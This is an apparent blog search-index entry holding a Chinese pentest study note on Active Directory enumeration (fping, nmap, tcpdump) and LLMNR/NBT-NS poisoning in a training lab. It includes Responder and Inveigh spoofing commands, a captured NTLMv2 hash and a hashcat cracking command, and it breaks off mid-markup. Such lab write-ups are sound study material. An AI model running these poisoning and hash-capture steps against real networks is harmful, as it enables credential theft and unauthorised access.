<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Active Directory Enumeration &amp; Attacks</title>
      <link href="/2024/11/20/pentest/lateral/Active%20Directory%20Enumeration%20&amp;%20Attacks/"/>
      <url>/2024/11/20/pentest/lateral/Active%20Directory%20Enumeration%20&amp;%20Attacks/</url>
      
        <content type="html"><![CDATA[<h1 id="Host-Enumeration"><a href="#Host-Enumeration" class="headerlink" title="Host Enumeration"></a>Host Enumeration</h1><p>关键数据</p><table><thead><tr><th align="left">Data Point</th><th align="left">Description</th></tr></thead><tbody><tr><td align="left"><code>AD Users</code></td><td align="left">尝试枚举可以作为密码喷洒目标的有效用户帐户。</td></tr><tr><td align="left"><code>AD Joined Computers</code></td><td align="left">关键计算机包括域控制器、文件服务器、SQL 服务器、Web 服务器、Exchange 邮件服务器、数据库服务器等。</td></tr><tr><td align="left"><code>Key Services</code></td><td align="left">Kerberos、NetBIOS、LDAP、DNS</td></tr><tr><td align="left"><code>Vulnerable Hosts and Services</code></td><td align="left">任何可以快速取胜的事情。（即容易利用并获得立足点的主机）</td></tr></tbody></table><h2 id="Passive"><a href="#Passive" class="headerlink" title="Passive"></a>Passive</h2><p>被动收集</p><h3 id="Wireshark"><a href="#Wireshark" class="headerlink" title="Wireshark"></a>Wireshark</h3><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-1729257350539.png" alt="ea-wireshark"></p><ul><li>ARP 数据包让知道主机：172.16.5.5、172.16.5.25 172.16.5.50、172.16.5.100 和 172.16.5.125。</li></ul><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-1729257350635.png" alt="ea-wireshark-mdns"></p><ul><li>MDNS 让知道ACADEMY-EA-WEB01 主机。</li></ul><h3 id="Tcpdump"><a href="#Tcpdump" class="headerlink" title="Tcpdump"></a>Tcpdump</h3><p>如果所在的主机没有 GUI（这是很常见的情况），可以使用<a href="https://linux.die.net/man/8/tcpdump">tcpdump</a>、<a href="https://github.com/DanMcInerney/net-creds">net-creds</a>和<a href="https://www.netminer.com/en/product/netminer.php">NetMiner</a>等来执行相同的功能。还可以使用 tcpdump 将捕获保存到 .pcap 文件，将其传输到另一台主机，然后在 Wireshark 中打开它。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo tcpdump -i ens224 </span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-1729257357287.gif" alt="tcpdump-example"></p><h3 id="Responder"><a href="#Responder" class="headerlink" title="Responder"></a>Responder</h3><p><a href="https://github.com/lgandx/Responder-Windows">Responder</a>是一款用于监听、分析和毒害<code>LLMNR</code>、<code>NBT-NS</code>、 以及<code>MDNS</code>请求和响应的工具。它还有许多其他功能，这里只利用了该工具的分析模式。这将被动地监听网络，而不会发送任何被毒害的数据包。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo responder -I ens224 -A </span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-1729257363590.gif" alt="responder-example"></p><h2 id="Active"><a href="#Active" class="headerlink" title="Active"></a>Active</h2><p>主动收集</p><h3 id="FPing"><a href="#FPing" class="headerlink" title="FPing"></a>FPing</h3><p><a href="https://fping.org/">Fping</a>为提供了与标准 ping 应用程序类似的功能，即利用 ICMP 请求和回复来联系主机并与之交互。fping 的亮点在于它能够同时向多个主机列表发出 ICMP 数据包，并且具有脚本功能。此外，它以循环方式工作，以循环方式查询主机，而不是等待对单个主机的多个请求返回后再继续。这些检查将帮助确定内部网络上是否有其他活动。ICMP 不是一站式服务，但它是一种轻松了解存在内容的初步方法。其他开放端口和活动协议可能会指向新主机以供以后定位。让看看它的实际效果。</p><p>这里将从<code>fping</code>几个标志开始：<code>a</code>显示活动的目标、<code>s</code>在扫描结束时打印统计信息、<code>g</code>从 CIDR 网络生成目标列表以及<code>q</code>不显示每个目标的结果。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">$ fping -asgq 172.16.5.0/23</span><br><span class="line"></span><br><span class="line">172.16.5.5</span><br><span class="line">172.16.5.25</span><br><span class="line">172.16.5.50</span><br><span class="line">172.16.5.100</span><br><span class="line">172.16.5.125</span><br><span class="line">172.16.5.200</span><br><span class="line">172.16.5.225</span><br><span class="line">172.16.5.238</span><br><span class="line">172.16.5.240</span><br><span class="line"></span><br><span class="line">     510 targets</span><br><span class="line">       9 alive</span><br><span class="line">     501 unreachable</span><br><span class="line">       0 unknown addresses</span><br><span class="line"></span><br><span class="line">    2004 timeouts (waiting for response)</span><br><span class="line">    2013 ICMP Echos sent</span><br><span class="line">       9 ICMP Echo Replies received</span><br><span class="line">    2004 other ICMP received</span><br><span class="line"></span><br><span class="line"> 0.029 ms (min round trip time)</span><br><span class="line"> 0.396 ms (avg round trip time)</span><br><span class="line"> 0.799 ms (max round trip time)</span><br><span class="line">       15.366 sec (elapsed real time)</span><br></pre></td></tr></table></figure><h3 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h3><p>扫描每台主机正在运行哪些服务，识别关键主机（例如<code>Domain Controllers</code>和<code>web servers</code>），并识别可能存在漏洞的主机以便稍后进行探测。由于专注于 AD，在进行广泛扫描之后，明智的做法是专注于伴随 AD 服务的标准协议，例如 DNS、SMB、LDAP 和 Kerberos 等。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></td><td class="code"><pre><span class="line">$ nmap -A -v -iL hosts.txt -oN nmap-enum</span><br><span class="line">Nmap scan report for inlanefreight.local (172.16.5.5)</span><br><span class="line">Host is up (0.054s latency).</span><br><span class="line">Not shown: 988 closed tcp ports (conn-refused)</span><br><span class="line">PORT     STATE SERVICE       VERSION</span><br><span class="line">53/tcp   open  domain        Simple DNS Plus</span><br><span class="line">88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-10-09 07:43:13Z)</span><br><span class="line">135/tcp  open  msrpc         Microsoft Windows RPC</span><br><span class="line">139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: INLANEFREIGHT.LOCAL0., Site: Default-First-Site-Name)</span><br><span class="line">| ssl-cert: Subject:</span><br><span class="line">| Subject Alternative Name: DNS:ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL, DNS:INLANEFREIGHT.LOCAL, DNS:INLANEFREIGHT</span><br><span class="line">| Not valid before: 2023-10-27T13:11:32</span><br><span class="line">|_Not valid after:  2024-10-26T13:11:32</span><br><span class="line">|_ssl-date: 2024-10-09T07:44:56+00:00; +10s from scanner time.</span><br><span class="line">445/tcp  open  microsoft-ds?</span><br><span class="line">464/tcp  open  kpasswd5?</span><br><span class="line">593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: INLANEFREIGHT.LOCAL0., Site: Default-First-Site-Name)</span><br><span class="line">| ssl-cert: Subject:</span><br><span class="line">| Subject Alternative Name: DNS:ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL, DNS:INLANEFREIGHT.LOCAL, DNS:INLANEFREIGHT</span><br><span class="line">| Not valid before: 2023-10-27T13:11:32</span><br><span class="line">|_Not valid after:  2024-10-26T13:11:32</span><br><span class="line">|_ssl-date: 2024-10-09T07:44:56+00:00; +10s from scanner time.</span><br><span class="line">3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: INLANEFREIGHT.LOCAL0., Site: Default-First-Site-Name)</span><br><span class="line">| ssl-cert: Subject:</span><br><span class="line">| Subject Alternative Name: DNS:ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL, DNS:INLANEFREIGHT.LOCAL, DNS:INLANEFREIGHT</span><br><span class="line">| Not valid before: 2023-10-27T13:11:32</span><br><span class="line">|_Not valid after:  2024-10-26T13:11:32</span><br><span class="line">|_ssl-date: 2024-10-09T07:44:56+00:00; +10s from scanner time.</span><br><span class="line">3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: INLANEFREIGHT.LOCAL0., Site: Default-First-Site-Name)</span><br><span class="line">|_ssl-date: 2024-10-09T07:44:56+00:00; +10s from scanner time.</span><br><span class="line">| ssl-cert: Subject:</span><br><span class="line">| Subject Alternative Name: DNS:ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL, DNS:INLANEFREIGHT.LOCAL, DNS:INLANEFREIGHT</span><br><span class="line">| Not valid before: 2023-10-27T13:11:32</span><br><span class="line">|_Not valid after:  2024-10-26T13:11:32</span><br><span class="line">3389/tcp open  ms-wbt-server Microsoft Terminal Services</span><br><span class="line">| ssl-cert: Subject: commonName=ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL</span><br><span class="line">| Not valid before: 2024-10-08T07:35:57</span><br><span class="line">|_Not valid after:  2025-04-09T07:35:57</span><br><span class="line">| rdp-ntlm-info:</span><br><span class="line">|   Target_Name: INLANEFREIGHT</span><br><span class="line">|   NetBIOS_Domain_Name: INLANEFREIGHT</span><br><span class="line">|   NetBIOS_Computer_Name: ACADEMY-EA-DC01</span><br><span class="line">|   DNS_Domain_Name: INLANEFREIGHT.LOCAL</span><br><span class="line">|   DNS_Computer_Name: ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL</span><br><span class="line">|   Product_Version: 10.0.17763</span><br><span class="line">|_  System_Time: 2024-10-09T07:43:52+00:00</span><br><span class="line">|_ssl-date: 2024-10-09T07:44:56+00:00; +10s from scanner time.</span><br><span class="line">Service Info: Host: ACADEMY-EA-DC01; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_nbstat: NetBIOS name: ACADEMY-EA-DC01, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 00:50:56:b0:04:b3 (VMware)</span><br><span class="line">|_clock-skew: mean: 10s, deviation: 0s, median: 9s</span><br><span class="line">| smb2-time:</span><br><span class="line">|   date: 2024-10-09T07:43:52</span><br><span class="line">|_  start_date: N/A</span><br><span class="line">| smb2-security-mode:</span><br><span class="line">|   3.1.1:</span><br><span class="line">|_    Message signing enabled and required</span><br><span class="line"></span><br><span class="line">Nmap scan report for 172.16.5.130</span><br><span class="line">Host is up (0.057s latency).</span><br><span class="line">Not shown: 992 closed tcp ports (conn-refused)</span><br><span class="line">PORT      STATE SERVICE       VERSION</span><br><span class="line">80/tcp    open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">135/tcp   open  msrpc         Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class="line">445/tcp   open  microsoft-ds?</span><br><span class="line">808/tcp   open  ccproxy-http?</span><br><span class="line">1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM</span><br><span class="line">| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback</span><br><span class="line">| Not valid before: 2024-10-09T07:36:01</span><br><span class="line">|_Not valid after:  2054-10-09T07:36:01</span><br><span class="line">|_ssl-date: 2024-10-09T07:44:46+00:00; 0s from scanner time.</span><br><span class="line">| ms-sql-ntlm-info:</span><br><span class="line">|   Target_Name: INLANEFREIGHT</span><br><span class="line">|   NetBIOS_Domain_Name: INLANEFREIGHT</span><br><span class="line">|   NetBIOS_Computer_Name: ACADEMY-EA-FILE</span><br><span class="line">|   DNS_Domain_Name: INLANEFREIGHT.LOCAL</span><br><span class="line">|   DNS_Computer_Name: ACADEMY-EA-FILE.INLANEFREIGHT.LOCAL</span><br><span class="line">|   DNS_Tree_Name: INLANEFREIGHT.LOCAL</span><br><span class="line">|_  Product_Version: 10.0.17763</span><br><span class="line">3389/tcp  open  ms-wbt-server Microsoft Terminal Services</span><br><span class="line">| ssl-cert: Subject: commonName=ACADEMY-EA-FILE.INLANEFREIGHT.LOCAL</span><br><span class="line">| Not valid before: 2024-10-08T07:35:45</span><br><span class="line">|_Not valid after:  2025-04-09T07:35:45</span><br><span class="line">|_ssl-date: 2024-10-09T07:44:46+00:00; 0s from scanner time.</span><br><span class="line">| rdp-ntlm-info:</span><br><span class="line">|   Target_Name: INLANEFREIGHT</span><br><span class="line">|   NetBIOS_Domain_Name: INLANEFREIGHT</span><br><span class="line">|   NetBIOS_Computer_Name: ACADEMY-EA-FILE</span><br><span class="line">|   DNS_Domain_Name: INLANEFREIGHT.LOCAL</span><br><span class="line">|   DNS_Computer_Name: ACADEMY-EA-FILE.INLANEFREIGHT.LOCAL</span><br><span class="line">|   DNS_Tree_Name: INLANEFREIGHT.LOCAL</span><br><span class="line">|   Product_Version: 10.0.17763</span><br><span class="line">|_  System_Time: 2024-10-09T07:43:41+00:00</span><br><span class="line">16001/tcp open  mc-nmf        .NET Message Framing</span><br><span class="line">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">| ms-sql-info:</span><br><span class="line">|   172.16.5.130:1433:</span><br><span class="line">|     Version:</span><br><span class="line">|       name: Microsoft SQL Server 2019 RTM</span><br><span class="line">|       number: 15.00.2000.00</span><br><span class="line">|       Product: Microsoft SQL Server 2019</span><br><span class="line">|       Service pack level: RTM</span><br><span class="line">|       Post-SP patches applied: false</span><br><span class="line">|_    TCP port: 1433</span><br><span class="line">|_nbstat: NetBIOS name: ACADEMY-EA-FILE, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 00:50:56:b0:63:a6 (VMware)</span><br><span class="line">| smb2-time:</span><br><span class="line">|   date: 2024-10-09T07:43:42</span><br><span class="line">|_  start_date: N/A</span><br><span class="line">| smb2-security-mode:</span><br><span class="line">|   3.1.1:</span><br><span class="line">|_    Message signing enabled but not required</span><br><span class="line"></span><br><span class="line">Nmap scan report for 172.16.5.225</span><br><span class="line">Host is up (0.059s latency).</span><br><span class="line">Not shown: 998 closed tcp ports (conn-refused)</span><br><span class="line">PORT     STATE SERVICE       VERSION</span><br><span class="line">22/tcp   open  ssh           OpenSSH 8.4p1 Debian 5 (protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   3072 97:cc:9f:d0:a3:84:da:d1:a2:01:58:a1:f2:71:37:e5 (RSA)</span><br><span class="line">|   256 03:15:a9:1c:84:26:87:b7:5f:8d:72:73:9f:96:e0:f2 (ECDSA)</span><br><span class="line">|_  256 55:c9:4a:d2:63:8b:5f:f2:ed:7b:4e:38:e1:c9:f5:71 (ED25519)</span><br><span class="line">3389/tcp open  ms-wbt-server xrdp</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br></pre></td></tr></table></figure><h3 id="script"><a href="#script" class="headerlink" title="script"></a>script</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># sh</span><br><span class="line">for i in &#123;1..254&#125; ;do (ping -c 1 172.16.5.$i | grep &quot;bytes from&quot; &amp;) ;done</span><br><span class="line"></span><br><span class="line"># cmd</span><br><span class="line">for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find &quot;Reply&quot;</span><br><span class="line"></span><br><span class="line"># powershell</span><br><span class="line">1..254 | % &#123;&quot;172.16.5.$($_): $(Test-Connection -count 1 -comp 172.15.5.$($_) -quiet)&quot;&#125;</span><br></pre></td></tr></table></figure><hr><h1 id="LLMNR-NBT-NS-Poisoning"><a href="#LLMNR-NBT-NS-Poisoning" class="headerlink" title="LLMNR&#x2F;NBT-NS Poisoning"></a>LLMNR&#x2F;NBT-NS Poisoning</h1><p><a href="https://datatracker.ietf.org/doc/html/rfc4795">链路本地多播名称解析</a>(LLMNR) 和<a href="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-2000-server/cc940063(v=technet.10)?redirectedfrom=MSDN">NetBIOS 名称服务</a>(NBT-NS) 是 Microsoft Windows 组件，可在 DNS 失败时用作主机识别的替代方法。如果计算机尝试解析主机但 DNS 解析失败，通常，该计算机将尝试通过 LLMNR 向本地网络上的所有其他计算机询问正确的主机地址。LLMNR 基于域名系统 (DNS) 格式，允许同一本地链路上的主机为其他主机执行名称解析。它原生使用<code>5355</code>UDP 上的端口。如果 LLMNR 失败，则将使用 NBT-NS。NBT-NS 通过其 NetBIOS 名称识别本地网络上的系统。NBT-NS 使用<code>137</code>UDP 上的端口。</p><p>关键在于，当使用 LLMNR&#x2F;NBT-NS 进行名称解析时，网络上的任何主机都可以回复。这就是用来<code>Responder</code>毒害这些请求的地方。通过网络访问，可以欺骗广播域中的权威名称解析源（在本例中，是应该属于网络段的主机），通过响应 LLMNR 和 NBT-NS 流量，就好像它们对请求主机有答案一样。这种毒害行为是为了让受害者与系统通信，假装流氓系统知道所请求主机的位置。如果所请求的主机需要名称解析或身份验证操作，可以捕获 NetNTLM Hash并对其进行离线暴力攻击，以尝试检索明文密码。捕获的身份验证请求还可以中继以访问另一台主机或用于同一主机上的其他协议（如 LDAP）。LLMNR&#x2F;NBNS 欺骗与缺乏 SMB 签名相结合通常会导致对域内主机的管理访问。 </p><p><strong>攻击流程</strong></p><ol><li>主机尝试连接到 \print01.inlanefreight.local 的打印服务器，但意外输入了 \printer01.inlanefreight.local。</li><li>DNS 服务器响应，指出该主机未知。</li><li>然后，主机向整个本地网络广播，询问是否有人知道 \printer01.inlanefreight.local 的位置。</li><li>攻击者（正在<code>Responder</code>运行的）响应主机，指出主机正在寻找的是 \printer01.inlanefreight.local。</li><li>主机相信此答复并使用用户名和 NTLMv2 密码哈希向攻击者发送身份验证请求。</li><li>然后，如果条件合适，可以离线破解此哈希值，或将其用于 SMB 中继攻击。</li></ol><p><strong>TTPs</strong></p><p>执行这些操作是为了收集通过网络以 NTLMv1 和 NTLMv2 密码哈希形式发送的身份验证信息。。然后，将获取哈希并尝试使用<a href="https://hashcat.net/hashcat/">Hashcat</a>或<a href="https://www.openwall.com/john/">John</a>等工具离线破解它们，目的是获取帐户的明文密码，用于获得初始立足点或扩展在域内的访问权限。</p><p>有几种工具可用于尝试 LLMNR 和 NBT-NS 中毒：</p><table><thead><tr><th>工具</th><th>描述</th></tr></thead><tbody><tr><td><a href="https://github.com/lgandx/Responder">Responder</a></td><td>Responder 是一种专门用于毒害 LLMNR、NBT-NS 和 MDNS 的工具，具有多种不同的功能。</td></tr><tr><td><a href="https://github.com/Kevin-Robertson/Inveigh">Inveigh</a></td><td>Inveigh 是一个跨平台 MITM 平台，可用于欺骗和毒害攻击。</td></tr><tr><td><a href="https://www.metasploit.com/">Metasploit</a></td><td>Metasploit 有几种内置扫描器和欺骗模块，用于应对毒化攻击。</td></tr></tbody></table><p>Responder 和 Inveigh 都可用于攻击以下协议：</p><ul><li>LLMNR</li><li>DNS</li><li>MDNS</li><li>NBNS</li><li>DHCP</li><li>ICMP</li><li>HTTP</li><li>HTTPS</li><li>SMB</li><li>LDAP</li><li>WebDAV</li><li>Proxy Auth</li></ul><p>Responder 还支持:</p><ul><li>MSSQL</li><li>DCE-RPC</li><li>FTP, POP3, IMAP, and SMTP auth</li></ul><h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h2><h3 id="Responder-1"><a href="#Responder-1" class="headerlink" title="Responder"></a>Responder</h3><p>支持的端口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UDP 137, UDP 138, UDP 53, UDP/TCP 389,TCP 1433, UDP 1434, TCP 80, TCP 135, TCP 139, TCP 445, TCP 21, TCP 3141,TCP 25, TCP 110, TCP 587, TCP 3128, Multicast UDP 5355 and 5353</span><br></pre></td></tr></table></figure><p>运行 Responder</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$ sudo responder -I ens224</span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br><span class="line"></span><br><span class="line">[SMB] NTLMv2-SSP Client   : 172.16.5.130</span><br><span class="line">[SMB] NTLMv2-SSP Username : INLANEFREIGHT\backupagent</span><br><span class="line">[SMB] NTLMv2-SSP Hash     : backupagent::INLANEFREIGHT:1ae5cf39915df51c:56B4DB4A04F5FD42D6EB32A731746D7C:010100000000000080C1EEB1031ADB01D00EFDEAAA2D70E500000000020008005A0052005200540001001E00570049004E002D005A003300340055004800580056004700390046004A0004003400570049004E002D005A003300340055004800580056004700390046004A002E005A005200520054002E004C004F00430041004C00030014005A005200520054002E004C004F00430041004C00050014005A005200520054002E004C004F00430041004C000700080080C1EEB1031ADB010600040002000000080030003000000000000000000000000030000093D4F972BB4A1768889451584B510B13CABEB87F10485717B8133FCE5BF3D9160A001000000000000000000000000000000000000900220063006900660073002F003100370032002E00310036002E0035002E003200320035000000000000000000</span><br><span class="line">[*] Skipping previously captured hash for INLANEFREIGHT\backupagent</span><br><span class="line">[*] Skipping previously captured hash for INLANEFREIGHT\backupagent</span><br><span class="line">[*] Skipping previously captured hash for INLANEFREIGHT\backupagent</span><br><span class="line">[*] Skipping previously captured hash for INLANEFREIGHT\backupagent</span><br><span class="line">[*] Skipping previously captured hash for INLANEFREIGHT\backupagent</span><br><span class="line">[*] Skipping previously captured hash for INLANEFREIGHT\backupagent</span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></table></figure><p>破解</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 5600 backupagent_hash /path/to/rockyou.txt</span><br></pre></td></tr></table></figure><h2 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h2><h3 id="Inveigh"><a href="#Inveigh" class="headerlink" title="Inveigh"></a>Inveigh</h3><p><a href="https://github.com/Kevin-Robertson/Inveigh">Inveigh </a>的工作原理与 Responder 类似，但使用 PowerShell 和 C# 编写。Inveigh 可以监听 IPv4 和 IPv6 以及其他几种协议，包括</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LLMNR, DNS, mDNS, NBNS, DHCPv6, ICMPv6, HTTP, HTTPS, SMB, LDAP, WebDAV, Proxy Auth</span><br></pre></td></tr></table></figure><p>导入 Inveigh 模块，列出 Invoke-Inveigh 参数</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Import-Module</span> .\Inveigh.ps1</span><br><span class="line"><span class="built_in">PS</span> C:\&gt; (<span class="built_in">Get-Command</span> <span class="built_in">Invoke-Inveigh</span>).Parameters</span><br></pre></td></tr></table></figure><p>使用 LLMNR 和 NBNS 欺骗启动 Inveigh，然后输出到控制台并写入文件。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Invoke-Inveigh</span> Y <span class="literal">-NBNS</span> Y <span class="literal">-ConsoleOutput</span> Y <span class="literal">-FileOutput</span> Y</span><br><span class="line"></span><br><span class="line">[*] Inveigh <span class="number">1.506</span> started at <span class="number">2022</span><span class="literal">-02-28T19</span>:<span class="number">26</span>:<span class="number">30</span></span><br><span class="line">[+] Elevated Privilege Mode = Enabled</span><br><span class="line">[+] Primary IP Address = <span class="number">172.16</span>.<span class="number">5.25</span></span><br><span class="line">[+] Spoofer IP Address = <span class="number">172.16</span>.<span class="number">5.25</span></span><br><span class="line">[+] ADIDNS Spoofer = Disabled</span><br><span class="line">[+] DNS Spoofer = Enabled</span><br><span class="line">[+] DNS TTL = <span class="number">30</span> Seconds</span><br><span class="line">[+] LLMNR Spoofer = Enabled</span><br><span class="line">[+] LLMNR TTL = <span class="number">30</span> Seconds</span><br><span class="line">[+] mDNS Spoofer = Disabled</span><br><span class="line">[+] NBNS Spoofer <span class="keyword">For</span> Types <span class="number">00</span>,<span class="number">20</span> = Enabled</span><br><span class="line">[+] NBNS TTL = <span class="number">165</span> Seconds</span><br><span class="line">[+] SMB Capture = Enabled</span><br><span class="line">[+] HTTP Capture = Enabled</span><br><span class="line">[+] HTTPS Certificate Issuer = Inveigh</span><br><span class="line">[+] HTTPS Certificate CN = localhost</span><br><span class="line">[+] HTTPS Capture = Enabled</span><br><span class="line">[+] HTTP/HTTPS Authentication = NTLM</span><br><span class="line">[+] WPAD Authentication = NTLM</span><br><span class="line">[+] WPAD NTLM Authentication Ignore List = Firefox</span><br><span class="line">[+] WPAD Response = Enabled</span><br><span class="line">[+] Kerberos TGT Capture = Disabled</span><br><span class="line">[+] Machine Account Capture = Disabled</span><br><span class="line">[+] Console Output = Full</span><br><span class="line">[+] File Output = Enabled</span><br><span class="line">[+] Output Directory = C:\Tools</span><br><span class="line">WARNING: [!] Run <span class="built_in">Stop-Inveigh</span> to stop</span><br><span 